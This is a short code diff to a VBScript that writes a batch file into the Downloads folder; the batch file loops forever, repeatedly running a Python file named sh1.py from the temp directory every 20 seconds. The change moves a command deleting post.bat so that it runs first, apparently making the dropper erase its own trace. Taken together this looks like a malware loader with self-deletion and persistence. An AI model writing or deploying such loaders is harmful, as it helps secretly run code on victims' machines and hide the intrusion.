@@ -5,6 +5,7 @@ objShell.CurrentDirectory = downloads_dir
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 Set objFile = objFSO.CreateTextFile("pro1.bat")
 objFile.WriteLine "@echo off"
+objFile.WriteLine "del %USERPROFILE%\Downloads\post.bat"
 objFile.WriteLine ":loop"
 objFile.WriteLine "set FILE=%temp%\sh1.py"
 objFile.WriteLine "if not exist %FILE% ("
@@ -57,7 +58,6 @@ objFile.WriteLine "   python %FILE%"
 objFile.WriteLine "   timeout /t 20 >nul"
 objFile.WriteLine ")"
 objFile.WriteLine "goto loop"
-objFile.WriteLine "del %USERPROFILE%\Downloads\post.bat"
 
 objFile.Close
 
